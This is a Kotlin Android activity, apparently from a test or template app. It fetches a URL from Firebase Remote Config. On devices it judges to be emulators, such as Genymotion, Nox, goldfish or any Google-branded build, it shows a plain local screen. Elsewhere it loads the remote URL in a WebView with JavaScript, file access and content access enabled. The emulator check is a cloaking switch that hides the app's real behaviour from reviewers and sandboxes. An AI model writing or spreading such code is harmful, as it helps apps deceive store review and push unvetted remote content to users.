package com.example.worktest.presentation

import android.content.DialogInterface
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.fragment.app.FragmentContainerView
import com.example.worktest.R
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import java.util.*

class MainActivity : AppCompatActivity() {

    private lateinit var mainContainer: FragmentContainerView
    private lateinit var webView: WebView
    private lateinit var sharedPreferences: SharedPreferences
    private var url: String? = null
    private val isEmu = checkIsEmu()


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        sharedPreferences = getPreferences(MODE_PRIVATE)
        url = sharedPreferences.getString(URL_KEY, null)
        if ((url == null) or (url == "")) {
            connectToFirebase()
        }

        if (isEmu or (url == "") or (url == null)) {
            setContentView(R.layout.fcv_activity_main)
            mainContainer = findViewById(R.id.main_container)
        } else {
            setContentView(R.layout.wv_activity_main)

            webView = findViewById(R.id.web_view)
            val webViewClient = (object: WebViewClient() {
                override fun onReceivedError(
                    view: WebView?,
                    request: WebResourceRequest?,
                    error: WebResourceError?
                ) {
                    errorDialog()
                    Log.d("MainActivityL", error.toString())
                }
            })
            webView.webViewClient = webViewClient

            webView.settings.javaScriptEnabled = true
            webView.settings.loadWithOverviewMode = true
            webView.settings.useWideViewPort = true
            webView.settings.domStorageEnabled = true
            webView.settings.databaseEnabled = true
            webView.settings.setSupportZoom(false)
            webView.settings.allowFileAccess = true
            webView.settings.allowContentAccess = true
            webView.settings.javaScriptCanOpenWindowsAutomatically = true

            webView.loadUrl(url!!)
        }
    }

    private fun connectToFirebase() {
        val remoteConfig = Firebase.remoteConfig
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 1
        }
        remoteConfig.setConfigSettingsAsync(configSettings)
        remoteConfig.activate()
        remoteConfig.fetch().addOnFailureListener {
            errorDialog()
            Log.d("MainActivityL", it.message.toString())
        }
        url = remoteConfig.getString(URL_KEY)
        if (url != "") {
            sharedPreferences.edit().putString(URL_KEY, url).apply()
        }
    }

    override fun onBackPressed() {
        if (isEmu or (url == "") or (url == null)) {
            super.onBackPressed()
        } else {
            if (webView.canGoBack()) {
                webView.goBack()
            }
        }
    }

    private fun checkIsEmu(): Boolean {
//        if (BuildConfig.DEBUG) return false

        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE
        val brand = Build.BRAND

        var result = (Build.FINGERPRINT.startsWith("generic") ||
                phoneModel.contains("google_sdk") ||
                phoneModel.lowercase(Locale.getDefault()).contains("droid4x") ||
                phoneModel.contains("Emulator") ||
                phoneModel.contains("Android SDK built for x86") ||
                Build.MANUFACTURER.contains("Genymotion") ||
                buildHardware == "goldfish" ||
                brand.contains("google") ||
                buildHardware == "vbox86" ||
                buildProduct == "sdk" ||
                buildProduct == "google_sdk" ||
                buildProduct == "sdk_x86" ||
                buildProduct == "vbox86p" ||
                Build.BOARD.lowercase(Locale.getDefault()).contains("nox") ||
                Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox") ||
                buildHardware.lowercase(Locale.getDefault()).contains("nox") ||
                buildProduct.lowercase(Locale.getDefault()).contains("nox"))
        if (result) return true
        result = result or (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
        return result
    }

    private fun errorDialog() {
        val alertDialog: AlertDialog = let {
            val builder = AlertDialog.Builder(it)
            builder.apply {
                setTitle(R.string.title)
                setMessage(R.string.message)
                setCancelable(false)

                setNegativeButton(R.string.exit,
                    DialogInterface.OnClickListener { dialog, id ->
                        // User cancelled the dialog
                        this@MainActivity.finish()
                    })

            }

            // Create the AlertDialog
            builder.create()
        }
        alertDialog.show()
    }

    companion object {
        private const val URL_KEY = "url"
    }
}